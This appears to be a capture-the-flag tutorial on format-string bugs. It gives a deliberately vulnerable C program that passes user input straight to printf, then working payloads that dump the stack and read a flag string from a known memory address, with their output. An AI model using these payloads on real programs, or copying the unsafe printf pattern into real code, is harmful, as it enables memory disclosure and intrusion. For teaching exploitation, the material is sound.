## Example: read string from a location in memory (like a flag)

```c
#include<stdio.h>

/* This will be in .data */
static char flag[] = "flag{y_u_so_good}";

int main(int argc, char** argv) {
	if(argc < 2) {
		printf("Usage: %s your_message\n", argv[0]);
		return 1;
	}
	printf("Hello there. You requested the following string to be printed: '%s'\n", argv[1]);
	char buf[64];
	strncpy(buf, argv[1], 63); buf[63] = 0;
	printf("Unsafe printing: ");
	printf(buf);
	printf("\nGoodbye.\n");

	return 0;
}
```

Compiling:
```bash
$ gcc -m32 -o fmt_arbitrary_read fmt_arbitrary_read.c 
```

Printing out the stack and finding our four A's (0x41414141):
```
$ ./fmt_arbitrary_read "AAAA%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x"
Hello there. You requested the following string to be printed: 'AAAA%08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x'
Unsafe printing: AAAAbffff7b0 0000003f bffff664 ffffffff bffff59e b7e2fbf8 41414141 78383025 38302520 30252078 25207838 20783830
Goodbye.
```

Great, so they're the seventh block being printed. Let's change the four A's with the location of the flag in the binary:
```
$ r2 -q -c 'iz~flag' fmt_arbitrary_read
vaddr=0x0804a02c paddr=0x0000102c ordinal=000 sz=18 len=17 section=.data type=a string=flag{y_u_so_good}
```

The flag is at `0x0804a02c`, now we just print the seventh argument on the stack:
```
$ ./fmt_arbitrary_read $(perl -e 'print "\x2c\xa0\x04\x08%7\$p"')
Hello there. You requested the following string to be printed: ',%7$p'
Unsafe printing: ,0x804a02c
Goodbye.
$ ./fmt_arbitrary_read $(perl -e 'print "\x2c\xa0\x04\x08%7\$s"')
Hello there. You requested the following string to be printed: ',%7$s'
Unsafe printing: ,flag{y_u_so_good}
Goodbye.
```

Note that it prints a comma before the flag itself. This is because our format string `\x2c\xa0\x04\x08%7\$s` is also printed. printf() just starts printing the bytes in this string (`\x2c\xa0\x04\x08`) until in encounters the format string `%7$s` which causes it do go on the stack, get the seventh argument and print that.


Or more useful is actually reading the GOT entries using this technique. See example 04 in this folder for an example of that.
